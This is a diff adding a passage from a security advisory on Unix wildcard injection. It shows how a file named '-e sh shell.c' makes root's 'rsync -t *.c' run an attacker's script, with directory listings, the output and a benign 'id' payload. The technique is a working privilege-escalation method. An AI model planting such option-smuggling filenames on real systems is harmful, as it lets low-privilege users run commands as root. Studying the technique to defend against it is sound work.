@@ -1,0 +1,95 @@
+https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
+
+https://www.slideshare.net/FaresEmir/old-school-hacking-exploiting-unix-wildcards
+
+==[ rsync file reference trick (file owner hijacking) ]==
+
+Rsync is "a fast, versatile, remote (and local) file-copying tool", that is very
+common on Unix systems.
+If we check 'rsync' manual page, we can again find options that can be abused for arbitrary 
+command execution.
+
+Rsync manual:
+"You use rsync in the same way you use rcp. You must specify a source and a destination, 
+one of which may be remote."
+
+Interesting rsync option from manual:
+
+ -e, --rsh=COMMAND           specify the remote shell to use
+     --rsync-path=PROGRAM    specify the rsync to run on remote machine
+
+
+Let's abuse one example directly from the 'rsync' manual page.
+Following example will copy all C files in local directory to a remote host 'foo' 
+in '/src' directory.
+# rsync -t *.c foo:src/
+
+Directory content:
+
+[root@defensecode public]# ls -al
+total 72
+drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
+drwx------. 24 user user  4096 Oct 28 18:32 ..
+-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
+-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
+-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
+-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
+-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
+-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
+-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
+-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
+-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
+-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
+-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
+-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
+-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
+
+Now root will try to copy all C files to the remote server.
+
+[root@defensecode public]# rsync -t *.c foo:src/
+
+rsync: connection unexpectedly closed (0 bytes received so far) [sender]
+rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]
+
+Let's see what happened...
+
+[root@defensecode public]# ls -al
+total 76
+drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .
+drwx------. 24 user user  4096 Oct 28 18:32 ..
+-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
+-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
+-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
+-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
+-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
+-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
+-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
+-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
+-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
+-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
+-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
+-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
+-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
+-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt
+
+There were two files owned by user 'leon', as listed below.
+
+-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
+-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
+
+After 'rsync' execution, new file shell_output.txt whose owner is root 
+is created in same directory.
+
+-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt
+
+If we check its content, following data is found.
+
+[root@defensecode public]# cat shell_output.txt
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+Trick is that because of the '*.c' wildcard, 'rsync' got '-e sh shell.c' option
+on command line, and shell.c will be executed upon 'rsync' start.
+Content of shell.c is presented below.
+
+[root@defensecode public]# cat shell.c
+/usr/bin/id > shell_output.txt
